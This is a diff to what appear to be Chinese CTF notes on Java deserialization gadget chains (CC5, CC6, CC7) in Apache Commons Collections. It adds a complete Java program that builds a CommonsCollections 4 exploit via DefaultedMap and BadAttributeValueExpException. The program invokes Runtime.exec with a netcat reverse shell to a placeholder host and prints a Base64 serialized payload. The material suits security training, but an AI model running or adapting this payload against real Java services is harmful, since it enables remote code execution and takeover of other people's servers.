@@ -42,11 +42,12 @@ CC2链：java<=JDK8u71(1.8.0_71)、CommonsCollections=4
 >CC2链是在CC4链的基础上修改。
 
 CC7链：java<=JDK8u71(1.8.0_71)、commons-collections:<=3.2.1
-CC5链：java<=JDK8u71(1.8.0_71)、commons-collections:<=3.2.1
+CC5链：java<=JDK8u71(1.8.0_71)、commons-collections:<=3.2.1  借助LazyMap
+
+
 
 ^
-CC7链改成适用CommonsCollections=4
-
+CC7链改成适用CommonsCollections=4。借助类LazyMap
 ```
 package show.ctf.java;
 
@@ -117,7 +118,9 @@ public class web851 {
 }
 ```
 
-CC6链改成适用CommonsCollections=4
+CC6链改成适用CommonsCollections=4，借助类LazyMap
+
+
 ```
 package show.ctf.java;
 
@@ -184,4 +187,73 @@ public class web851 {
     }
 }
 ```
+
+^
+CC5链改成适用CommonsCollections=4。借助类DefaultedMap。
+
+
+```
+package show.ctf.java;
+
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.apache.commons.collections4.keyvalue.TiedMapEntry;
+import org.apache.commons.collections4.map.DefaultedMap;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.util.Base64;
+
+public class web854 {
+    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
+                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"nc your-ip your-port -e /bin/sh"})
+//                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        DefaultedMap defaultedMap = new DefaultedMap(chainedTransformer);
+
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(defaultedMap,"evo1");
+
+        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("evo");
+
+        Class bc = badAttributeValueExpException.getClass();
+        Field val = bc.getDeclaredField("val");
+        val.setAccessible(true);
+        val.set(badAttributeValueExpException,tiedMapEntry);
+
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(badAttributeValueExpException);
+
+        byte[] payloadBytes = byteArrayOutputStream.toByteArray();
+        String payload = Base64.getEncoder().encodeToString(payloadBytes);
+        System.out.println(payload);
+
+//        serialize(badAttributeValueExpException);
+//        unserialize("ser.bin");
+    }
+
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
+        oos.writeObject(obj);
+    }
+
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    }
+}
+```
+
+
 
